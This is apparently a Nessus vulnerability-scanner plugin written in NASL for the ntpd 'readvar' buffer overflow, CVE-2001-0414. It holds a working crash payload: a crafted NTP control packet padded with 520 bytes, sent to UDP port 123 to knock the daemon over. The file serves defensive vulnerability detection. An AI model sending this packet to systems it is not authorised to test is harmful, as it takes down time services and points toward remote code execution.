#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(10647);
  script_version("$Revision: 1.36 $");
  script_cvs_date("$Date: 2016/12/07 20:46:53 $");

  script_cve_id("CVE-2001-0414");
  script_bugtraq_id(2540);
  script_osvdb_id(805);
  script_xref(name:"CERT", value:"970472");
  script_xref(name:"EDB-ID", value:"20727");

  script_name(english:"Network Time Protocol Daemon (ntpd) readvar Variable Overflow RCE");
  script_summary(english:"Crashes the remote ntpd.");

  script_set_attribute(attribute:"synopsis", value:
"The remote NTP server is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote NTP server is affected by a buffer overflow condition due
to improper bounds checking on the 'readvar' argument. An
unauthenticated, remote attacker can exploit this, via a specially
crafted request that uses an overly long argument, to execute
arbitrary code with root privileges.");
  script_set_attribute(attribute:"solution", value:
"Disable this service if you do not use it, or check with the vendor
for an upgrade to a fixed version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'NTP Daemon readvar Buffer Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2001/04/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2001/04/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ntp:ntp");
  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");

  script_dependencies("ntp_open.nasl");
  script_require_keys("NTP/Running", "Settings/ParanoidReport");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

# Make sure NTP server is running
get_kb_item_or_exit('NTP/Running');

if (report_paranoia < 2) audit(AUDIT_PARANOID);


function ntp_installed()
{
local_var data, r, soc;

data = raw_string(0xDB, 0x00, 0x04, 0xFA, 0x00, 0x01,
    		  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0xBE, 0x78, 0x2F, 0x1D, 0x19, 0xBA,
		  0x00, 0x00);

soc = open_sock_udp(123);
send(socket:soc, data:data);
r = recv(socket:soc, length:4096);
close(soc);
if(strlen(r) > 10)
 {
 return(1);
 }
return(0);
}

if(!(get_udp_port_state(123)))exit(0);


if(ntp_installed())
{
soc = open_sock_udp(123);
buf = raw_string(0x16, 0x02, 0x00, 0x01, 0x00, 0x00,
    		 0x00, 0x00, 0x00, 0x00, 0x01, 0x36, 0x73, 0x74,
		 0x72, 0x61, 0x74, 0x75, 0x6D, 0x3D) + crap(520);

send(socket:soc, data:buf);


buf = raw_string(0x16, 0x02, 0x00, 0x02, 0x00, 0x00,
    		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);

send(socket:soc, data:buf);
close(soc);
if(!(ntp_installed()))security_hole(port:123, protocol:"udp");
}
